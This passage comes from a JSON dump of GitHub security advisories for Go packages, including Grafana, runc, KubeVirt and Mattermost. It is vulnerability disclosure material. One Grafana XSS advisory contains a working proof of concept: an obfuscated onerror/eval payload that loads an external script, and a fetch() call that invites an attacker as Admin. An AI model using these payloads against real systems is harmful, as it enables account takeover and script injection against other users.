["CWE-281"], "severity": "LOW", "github_reviewed": true, "github_reviewed_at": "2023-03-30T20:17:24Z", "nvd_published_at": "2023-03-29T19:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-xvfj-84vc-hrmf", "modified": "2023-03-23T16:30:25Z", "published": "2023-03-21T06:30:17Z", "aliases": ["CVE-2023-1536"], "summary": "Answer vulnerable to Stored Cross-site Scripting", "details": "Cross-site Scripting (XSS) - Stored in GitHub repository answerdev/answer prior to 1.0.7.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/answerdev/answer"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.0.7"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-1536"}, {"type": "WEB", "url": "https://github.com/answerdev/answer/commit/c3743bad4f2a69f69f8f1e1e5b4b6524fc03da25"}, {"type": "PACKAGE", "url": "https://github.com/answerdev/answer"}, {"type": "WEB", "url": "https://huntr.dev/bounties/538207f4-f805-419a-a314-51716643f05e"}], "database_specific": {"cwe_ids": ["CWE-79"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-03-21T22:32:01Z", "nvd_published_at": "2023-03-21T05:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-hjv9-hm2f-rpcj", "modified": "2023-03-09T04:23:52Z", "published": "2023-03-01T18:30:59Z", "aliases": ["CVE-2023-0507"], "summary": "Grafana vulnerable to Cross-site Scripting", "details": "Grafana is an open-source platform for monitoring and observability. Starting with the 8.1 branch, Grafana had a stored XSS vulnerability affecting the core plugin GeoMap. The stored XSS vulnerability was possible due to map attributions weren't properly sanitized and allowed arbitrary JavaScript to be executed in the context of the currently authorized user of the Grafana instance. An attacker needs to have the Editor role in order to change a panel to include a map attribution containing JavaScript. This means that vertical privilege escalation is possible, where a user with Editor role can change to a known password for a user having Admin role if the user with Admin role executes malicious JavaScript viewing a dashboard. Users may upgrade to version 8.5.21, 9.2.13 and 9.3.8 to receive a fix.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/grafana/grafana"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "8.1.0"}, {"fixed": "8.5.21"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/grafana/grafana"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "9.0.0"}, {"fixed": "9.2.13"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/grafana/grafana"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "9.3.0"}, {"fixed": "9.3.8"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-0507"}, {"type": "PACKAGE", "url": "https://github.com/grafana/grafana"}, {"type": "WEB", "url": "https://grafana.com/security/security-advisories/cve-2023-0507/"}, {"type": "WEB", "url": "https://security.netapp.com/advisory/ntap-20230413-0001/"}], "database_specific": {"cwe_ids": ["CWE-79"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-03-02T23:06:08Z", "nvd_published_at": "2023-03-01T16:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-5g39-ppwg-6xx8", "modified": "2023-10-02T10:43:35Z", "published": "2023-03-16T18:32:38Z", "aliases": ["CVE-2023-28105"], "summary": "Go-huge-util vulnerable to path traversal when unzipping files", "details": "Impact\nZipSlip issue when use fsutil package to unzip files.\nWhen users use zip.Unzip to unzip zip files from a malicious attacker, they may be vulnerable to path traversal.\n\nPatches\nIt has been fixed in v0.0.34, Please upgrade version to v0.0.34 or above.\n\nWorkarounds\nNo, users have to upgrade version.\n\nSpecific Go Packages Affected\ngithub.com/dablelv/go-huge-util/zip\n\nReferences", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:H/A:L"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/dablelv/go-huge-util"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.0.34"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/dablelv/go-huge-util/security/advisories/GHSA-5g39-ppwg-6xx8"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-28105"}, {"type": "WEB", "url": "https://github.com/dablelv/go-huge-util/commit/0e308b0fac8973e6fa251b0ab095cdc5c1c0956b"}, {"type": "PACKAGE", "url": "https://github.com/dablelv/go-huge-util"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2023-1640"}], "database_specific": {"cwe_ids": ["CWE-22"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2023-03-16T18:32:38Z", "nvd_published_at": "2023-03-16T17:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-8gg8-wr4j-v2wr", "modified": "2023-03-28T02:42:24Z", "published": "2023-03-22T21:30:16Z", "aliases": ["CVE-2022-45003"], "summary": "Gophish vulnerable to Denial of Service via crafted payload involving autofocus", "details": "Gophish through 0.12.1 allows attackers to cause a Denial of Service (DoS) via a crafted payload involving autofocus.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/gophish/gophish"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"last_affected": "0.12.1"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-45003"}, {"type": "PACKAGE", "url": "https://github.com/gophish/gophish"}, {"type": "WEB", "url": "https://github.com/gophish/gophish/releases/tag/v0.12.1"}, {"type": "WEB", "url": "https://pastebin.com/z5MD3z8c"}], "database_specific": {"cwe_ids": [], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2023-03-22T22:22:07Z", "nvd_published_at": "2023-03-22T21:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-g2j6-57v7-gm8c", "modified": "2023-03-30T20:20:23Z", "published": "2023-03-30T20:20:23Z", "aliases": ["CVE-2023-28642"], "summary": "runc AppArmor bypass with symlinked /proc", "details": "### Impact\nIt was found that AppArmor, and potentially SELinux, can be bypassed when `/proc` inside the container is symlinked with a specific mount configuration.\n\n### Patches\nFixed in runc v1.1.5, by prohibiting symlinked `/proc`: https://github.com/opencontainers/runc/pull/3785\n\nThis PR fixes CVE-2023-27561 as well.\n\n### Workarounds\nAvoid using an untrusted container image.\n\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:L"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/opencontainers/runc"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.1.5"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/opencontainers/runc/security/advisories/GHSA-g2j6-57v7-gm8c"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-28642"}, {"type": "WEB", "url": "https://github.com/opencontainers/runc/pull/3785"}, {"type": "PACKAGE", "url": "https://github.com/opencontainers/runc"}], "database_specific": {"cwe_ids": ["CWE-281", "CWE-59"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-03-30T20:20:23Z", "nvd_published_at": "2023-03-29T19:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-fx2v-qfhr-4chv", "modified": "2023-03-07T20:37:09Z", "published": "2023-03-07T20:37:09Z", "aliases": ["CVE-2023-27475"], "summary": "Goutil vulnerable to path traversal when unzipping files", "details": "### Impact\n\nZipSlip issue when use fsutil package to unzip files.\nWhen users use fsutil.Unzip to unzip zip files from a malicious attacker, they may be vulnerable to path traversal. \n\n### Patches\n\nIt has been fixed in v0.6.0, Please upgrade version to v0.6.0 or above.\n\n### Workarounds\nNo, users have to upgrade version.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/gookit/goutil"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.6.0"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/gookit/goutil/security/advisories/GHSA-fx2v-qfhr-4chv"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-27475"}, {"type": "WEB", "url": "https://github.com/gookit/goutil/commit/d7b94fede71f018f129f7d21feb58c895d28dadc"}, {"type": "PACKAGE", "url": "https://github.com/gookit/goutil"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2023-1611"}, {"type": "WEB", "url": "https://security.netapp.com/advisory/ntap-20230427-0003/"}], "database_specific": {"cwe_ids": ["CWE-22"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2023-03-07T20:37:09Z", "nvd_published_at": "2023-03-07T18:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-rvjp-8qj4-8p29", "modified": "2023-03-23T16:30:08Z", "published": "2023-03-21T06:30:17Z", "aliases": ["CVE-2023-1538"], "summary": "Answer has Observable Timing Discrepancy", "details": "Observable Timing Discrepancy in GitHub repository answerdev/answer prior to 1.0.6.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/answerdev/answer"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.0.6"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-1538"}, {"type": "WEB", "url": "https://github.com/answerdev/answer/commit/813ad0b9894673b1bdd489a2e9ab60a44fe990af"}, {"type": "PACKAGE", "url": "https://github.com/answerdev/answer"}, {"type": "WEB", "url": "https://huntr.dev/bounties/ac0271eb-660f-4966-8b57-4bc660a9a1a0"}], "database_specific": {"cwe_ids": ["CWE-203", "CWE-208"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-03-21T22:32:24Z", "nvd_published_at": "2023-03-21T05:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-x5rv-w9pm-8qp8", "modified": "2023-03-01T19:17:17Z", "published": "2023-03-01T19:17:17Z", "aliases": ["CVE-2023-0092"], "summary": "Juju controller - Arbitrary file reading vulnerability", "details": "### Impact\nAn authenticated user who has read access to the juju controller model, may construct a remote request to download an arbitrary file from the controller's filesystem.\n\n### Patches\nPatched in juju 2.9.38 and juju 3.0.3\n[juju/juju#ef803e2](https://github.com/juju/juju/commit/ef803e2a13692d355b784b7da8b4b1f01dab1556)\n\n### Workarounds\nLimit read access to the controller model to only trusted users.\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:N/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/juju/juju"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "2.9.22"}, {"fixed": "2.9.38"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/juju/juju"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "3.0.0"}, {"fixed": "3.0.3"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/juju/juju/security/advisories/GHSA-x5rv-w9pm-8qp8"}, {"type": "WEB", "url": "https://github.com/juju/juju/commit/ef803e2a13692d355b784b7da8b4b1f01dab1556"}, {"type": "WEB", "url": "https://bugs.launchpad.net/juju/+bug/1999622"}, {"type": "PACKAGE", "url": "https://github.com/juju/juju"}], "database_specific": {"cwe_ids": ["CWE-73"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-03-01T19:17:17Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-9hj7-v56g-rhf6", "modified": "2023-04-07T21:24:51Z", "published": "2023-03-31T12:30:16Z", "aliases": ["CVE-2023-1774"], "summary": "Mattermost fails to properly authentication inviter's permissions to private channel", "details": "When processing an email invite to a private channel on a team, Mattermost fails to validate the inviter's permission to that channel, allowing an attacker to invite themselves to a private channel.\n\n[Issue Identifier](https://mattermost.com/security-updates/): MMSA-2023-00137", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/mattermost/mattermost-server"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "3.3.0"}, {"fixed": "7.1.6"}]}], "database_specific": {"last_known_affected_version_range": "<= 4.10.10"}}, {"package": {"ecosystem": "Go", "name": "github.com/mattermost/mattermost-server"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "7.7.0"}, {"fixed": "7.7.2"}]}], "database_specific": {"last_known_affected_version_range": "<= 7.7.1"}}, {"package": {"ecosystem": "Go", "name": "github.com/mattermost/mattermost-server"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "7.1.0"}, {"fixed": "7.1.6"}]}], "database_specific": {"last_known_affected_version_range": "<= 7.1.5"}}, {"package": {"ecosystem": "Go", "name": "github.com/mattermost/mattermost-server/v5"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "5.0.0"}, {"fixed": "7.1.6"}]}], "database_specific": {"last_known_affected_version_range": "<= 5.39.3"}}, {"package": {"ecosystem": "Go", "name": "github.com/mattermost/mattermost-server/v6"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "6.0.0"}, {"fixed": "7.1.6"}]}], "database_specific": {"last_known_affected_version_range": "<= 6.7.2"}}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-1774"}, {"type": "WEB", "url": "https://mattermost.com/security-updates/"}, {"type": "PACKAGE", "url": "github.com/mattermost/mattermost-server"}], "database_specific": {"cwe_ids": ["CWE-862"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-04-07T21:24:51Z", "nvd_published_at": "2023-03-31T12:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-f6hc-9g49-xmx7", "modified": "2023-04-04T16:14:37Z", "published": "2023-03-01T22:36:36Z", "aliases": ["CVE-2023-24533"], "summary": "nistec has Incorrect Calculation in Multiplication of unreduced P-256 scalars", "details": "Multiplication of certain unreduced P-256 scalars produce incorrect results. There are no protocols known at this time that can be attacked due to this.\n\nFrom the fix commit notes:\n\n> Unlike the rest of nistec, the P-256 assembly doesn't use complete addition formulas, meaning that p256PointAdd[Affine]Asm won't return the correct value if the two inputs are equal.\n> \n> This was (undocumentedly) ignored in the scalar multiplication loops because as long as the input point is not the identity and the scalar is lower than the order of the group, the addition inputs can't be the same.\n> \n> As part of the math/big rewrite, we went however from always reducing the scalar to only checking its length, under the incorrect assumption that the scalar multiplication loop didn't require reduction.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "filippo.io/nistec"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.0.2"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-24533"}, {"type": "WEB", "url": "https://github.com/FiloSottile/nistec/commit/c58aa1223ccf3943513e1e661cebce95af137244"}, {"type": "PACKAGE", "url": "https://github.com/FiloSottile/nistec"}, {"type": "WEB", "url": "https://go.dev/issue/58647"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2023-1595"}], "database_specific": {"cwe_ids": ["CWE-682"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2023-03-01T22:36:36Z", "nvd_published_at": "2023-03-08T20:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-83qr-c7m9-wmgw", "modified": "2023-03-23T19:11:03Z", "published": "2023-03-21T06:30:17Z", "aliases": ["CVE-2023-1535"], "summary": "Answer vulnerable to Stored Cross-site Scripting", "details": "Cross-site Scripting (XSS) - Stored in GitHub repository answerdev/answer prior to 1.0.7.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/answerdev/answer"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.0.7"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-1535"}, {"type": "WEB", "url": "https://github.com/answerdev/answer/commit/c3743bad4f2a69f69f8f1e1e5b4b6524fc03da25"}, {"type": "PACKAGE", "url": "https://github.com/answerdev/answer"}, {"type": "WEB", "url": "https://huntr.dev/bounties/4d4b0caa-6d8c-4574-ae7e-e9ef5e2e1a40"}], "database_specific": {"cwe_ids": ["CWE-79"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-03-21T22:31:54Z", "nvd_published_at": "2023-03-21T05:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-qrrg-gw7w-vp76", "modified": "2023-03-23T20:10:47Z", "published": "2023-03-23T20:10:47Z", "aliases": ["CVE-2023-1410"], "summary": "Grafana Stored Cross-site Scripting in Graphite FunctionDescription tooltip", "details": "### Summary\nWhen a Graphite data source is added, one can use this data source in a dashboard. This contains a feature to use `Functions`. Once a function is selected, a small tooltip will be shown when hovering over the name of the function. This tooltip will allow you to delete the selected Function from your query or show the Function Description. However, no sanitization is done when adding this description to the DOM. Since it is not uncommon to connect to public data sources, and attacker could host a Graphite instance with modified Function Descriptions containing XSS payloads. When the victim uses it in a query and accidentally hovers over the Function Description, an attacker controlled XSS payload will be executed. This can be used to add the attacker as an Admin for example. \n\n### Details\n\n1. Spin up your own Graphite instance. I've done this using the `make devenv sources=graphite`.\n2. Now start a terminal for your Graphite container and modify the following file `/opt/graphite/webapp/graphite/render/functions.py` \n3. Basically you can pick any function but I picked the `aggregateSeriesLists` function. Modify its description to be `\"><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vY20yLnRlbCI7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTs= onerror=eval(atob(this.id))>`\n\nThe result would look like this:\n\n```python\ndef aggregateSeriesLists(requestContext, seriesListFirstPos, seriesListSecondPos, func, xFilesFactor=None):\n  \"\"\"                                                                              \n                                                                                              \n  \"><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vY20yLnRlbCI7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTs= onerror=eval(atob(this.id))>\n                                                                           \n  \"\"\"                  \n  if len(seriesListFirstPos) != len(seriesListSecondPos):   \n    raise InputParameterError(             \n      \"seriesListFirstPos and seriesListSecondPos argument must have equal length\")\n  results = []                                          \n                                    \n  for i in range(0, len(seriesListFirstPos)):        \n    firstSeries = seriesListFirstPos[i]                                           \n    secondSeries = seriesListSecondPos[i]         \n    aggregated = aggregate(requestContext, (firstSeries, secondSeries), func, xFilesFactor=xFilesFactor) \n    if not aggregated: # empty list, no data found                          \n      continue                   \n    result = aggregated[0]  # aggregate() can only return len 1 list           \n    result.name = result.name[:result.name.find('Series(')] + 'Series(%s,%s)' % (firstSeries.name, secondSeries.name)\n    results.append(result)                                                                           \n  return results                                                         \n                                                                                                                   \n                                                                                                       \naggregateSeriesLists.group = 'Combine'                                                             \naggregateSeriesLists.params = [\n  Param('seriesListFirstPos', ParamTypes.seriesList, required=True),\n  Param('seriesListSecondPos', ParamTypes.seriesList, required=True),\n  Param('func', ParamTypes.aggFunc, required=True),                                                       \n  Param('xFilesFactor', ParamTypes.float),                                \n]                                                                                                \n```\n\n4. Save and quit the file. Restart your Graphite Container (I did this using the Restart Icon in Docker Desktop)\n5. Now login to your Grafana instance as an Organisation Admin.\n6. Navigate to http://[grafana]/plugins/graphite and click `Create a Graphite data source`\n7. Add the url to the attackers Graphite instance (maybe enable `Skip TLS Verify`) and click `Save & test` and `Explore`\n8. In the newly opened page click the + icon next to `Functions` and search for `aggregateSeriesLists` and click it to add it.\n9. Now hover over `aggregateSeriesLists` with your mouse and move your mouse to the `?` icon.\n\n### Result\n\nOur payload will trigger and in this case it will include an external script to trigger the alerts.\n\n#### Decoded payload\n\n```javascript\nvar a=document.createElement(\"script\");a.src=\"https://cm2.tel\";document.body.appendChild(a);\n```\n\n![image](https://user-images.githubusercontent.com/26874824/225035735-5d00e5d9-3302-4257-8f95-dd562e752893.png)\n\n\n### Impact\n\nIn the POC we've picked 1 function to have a XSS payload, but a real attacker would of course maximize the likelihood by replacing all of it's descriptions with XSS payloads. As shown above the attacker can now run arbitrary javascript in the browser of the victim. The victim can be any user using the malicious Graphite instance in a query (or while Exploring), including the Organisation Admin. If so, an attacker could include a payload to add them as an admin themselves.\n\nAn example would be something like this:\n\n```javascript\nfetch(\"/api/org/invites\", {\n  \"headers\": {\n    \"content-type\": \"application/json\"\n  },\n  \"body\": \"{\\\"name\\\":\\\"\\\",\\\"email\\\":\\\"\\\",\\\"role\\\":\\\"Admin\\\",\\\"sendEmail\\\":true,\\\"loginOrEmail\\\":\\\"hacker@hacker.com\\\"}\",\n  \"method\": \"POST\",\n  \"credentials\": \"include\"\n});\n```\n\n### Mitigation\n\nThe vulnerability seems to occur in the following file: public\\app\\plugins\\datasource\\graphite\\components\\FunctionEditorControls.tsx\n\n```typescript\nconst FunctionDescription = React.lazy(async () => {\n  // @ts-ignore\n  const { default: rst2html } = await import(/* webpackChunkName: \"rst2html\" */ 'rst2html');\n  return {\n    default(props: { description?: string }) {\n      return <div dangerouslySetInnerHTML={{ __html: rst2html(props.description ?? '') }} />;\n    },\n  };\n});\n```\n\nIn many other similar cases, some form of sanitization is used. I would advise to use the same here as rst2html itself will just leave HTML untouched when parsing the expected reStructuredText from Graphite. So now when it is applied using dangerouslySetInnerHTML our XSS payload will survive.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:H/PR:H/UI:R/S:C/C:H/I:L/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/grafana/grafana"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "8.0.0"}, {"fixed": "8.5.22"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/grafana/grafana"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "9.3.0"}, {"fixed": "9.3.11"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/grafana/grafana"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "9.4.0"}, {"fixed": "9.4.7"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/grafana/grafana"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "9.0.0"}, {"fixed": "9.2.15"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/grafana/bugbounty/security/advisories/GHSA-qrrg-gw7w-vp76"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-1410"}, {"type": "WEB", "url": "https://github.com/grafana/grafana/commit/42911348a76e8484396b951bef8b7bff97a84cbc"}, {"type": "WEB", "url": "https://github.com/grafana/grafana/commit/e59427c0747ae2f3feb1bfc3a4b87f0886208cc6"}, {"type": "WEB", "url": "https://github.com/grafana/grafana/commit/ef2eb2b6bf1d7c0fb781e3e05d0d1aecd6dd438a"}, {"type": "WEB", "url": "https://github.com/grafana/grafana/commit/f9548d33f8624d6694983fe5aad181007405be8a"}, {"type": "PACKAGE", "url": "https://github.com/grafana/grafana"}, {"type": "WEB", "url": "https://grafana.com/security/security-advisories/cve-2023-1410/"}], "database_specific": {"cwe_ids": ["CWE-79"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-03-23T20:10:47Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-cp96-jpmq-xrr2", "modified": "2023-03-27T22:24:34Z", "published": "2023-03-16T16:04:42Z", "aliases": ["CVE-2023-26484"], "summary": "On a compromised node, the virt-handler service account can be used to modify all node specs", "details": "### Impact\n\nIf a malicious user has taken over a Kubernetes node where virt-handler (the KubeVirt node-daemon) is running, the virt-handler service account can be used to modify all node specs.\n\nThis can be misused to lure-in system-level-privileged components (which can for instance read all secrets on the cluster, or can exec into pods on other nodes). This way a compromised node can be used to elevate privileges beyond the node until potentially having full privileged access to the whole cluster.\n\nThe simplest way to exploit this, once a user could compromise a specific node, is to set with the virt-handler service account all other nodes to unschedulable and simply wait until system-critical components with high privileges appear on its node.\n\nSince this requires a node to be compromised first, the severity of this finding is considered Medium.\n\n### Patches\n\nNot yet available.\n\n### Workarounds\nGatekeeper users can add a webhook which will block the `virt-handler` service account to modify the spec of a node.\n\nAn example policy, preventing virt-handler from changing the node spec may look like this:\n\n```yaml\napiVersion: templates.gatekeeper.sh/v1\nkind: ConstraintTemplate\nmetadata:\n  name: virthandlerrestrictions\nspec:\n[...]\n  targets:\n    - libs:\n        - |         \n[...]          \n          is_virt_handler(username) {\n              username == \"system:serviceaccount:kubevirt:virt-handler\"\n          }\n          mutates_node_in_unintended_way {\n            # TODO\n            # only allow kubevirt.io/ prefixed metadata node changes\n          }\n      rego: |\n[...]\n        \n        violation[{\"msg\": msg}] {\n          is_virt_handler(username)\n          mutates_node_in_unintended_way(input.review.object, input.review.oldObject)\n          msg := sprintf(\"virt-handler tries to modify node <%v> in an unintended way.\", [input.review.object.name])\n        }\n```\n\nand applying this template to node modifications.\n\n\n### Credits\n\nSpecial thanks to the discoverers of this issue:\n\nNanzi Yang (nzyang@stu.xidian.edu.cn)\nXin Guo (guox@stu.xidian.edu.cn)\nJietao Xiao (jietaoXiao@stu.xidian.edu.cn)\nWenbo Shen (shenwenbo@zju.edu.cn)\nJinku Li (jkli@xidian.edu.cn)\n\n### References\n\nhttps://github.com/kubevirt/kubevirt/issues/9109", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:C/C:H/I:H/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "kubevirt.io/kubevirt"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"last_affected": "0.59.0"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/kubevirt/kubevirt/security/advisories/GHSA-cp96-jpmq-xrr2"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-26484"}, {"type": "WEB", "url": "https://github.com/kubevirt/kubevirt/issues/9109"}, {"type": "PACKAGE", "url": "https://github.com/kubevirt/kubevirt"}], "database_specific": {"cwe_ids": ["CWE-863"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2023-03-16T16:04:42Z", "nvd_published_at": "2023-03-15T21:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-ch7v-37xg-75ph", "modified": "2023-03-14T19:39:51Z", "published": "2023-03-03T18:30:27Z", "aliases": ["CVE-2022-2835"], "summary": "coreDNS vulnerable to Improper Restriction of Communication Channel to Intended Endpoints", "details": "A flaw was found in coreDNS. This flaw allows a malicious user to reroute internal calls to some internal services that were accessed by the FQDN in a format of <service>.<namespace>.svc.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/coredns/coredns"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"last_affected": "1.9.3"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-2835"}, {"type": "WEB", "url": "https://bugzilla.redhat.com/show_bug.cgi?id=2118542"}, {"type": "PACKAGE", "url": "https://github.com/coredns/coredns"}], "database_specific": {"cwe_ids": ["CWE-923"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-03-03T23:11:00Z", "nvd_published_at": "2023-03-03T16:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-3cgw-hfw7-wc7j", "modified": "2023-03-27T22:32:19Z", "published": "2023-03-23T09:30:25Z", "withdrawn": "2023-03-23T20:10:27Z", "aliases": [], "summary": "Duplicate Advisory: Grafana Stored Cross-site Scripting vulnerability", "details": "## Duplicate Advisory\nThis advisory has been withdrawn because it is a duplicate of [GHSA-qrrg-gw7w-vp76](https://github.com/advisories/GHSA-qrrg-gw7w-vp76). This link is maintained to preserve external references.\n\n## Original Description\nGrafana is an open-source platform for monitoring and observability. Grafana had a stored XSS vulnerability in the Graphite FunctionDescription tooltip. The stored XSS vulnerability was possible due the value of the Function Description was not properly sanitized. An attacker needs to have control over the Graphite data source in order to manipulate a function description and a Grafana admin needs to configure the data source, later a Grafana user needs to select a tampered function and hover over the description. Users may upgrade to version 8.5.22, 9.2.15 and 9.3.11 to receive a fix.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:H/UI:R/S:C/C:L/I:L/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/grafana/grafana"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "8.5.22"}]}]}, {"package": {"ecosystem": "Go", "name": 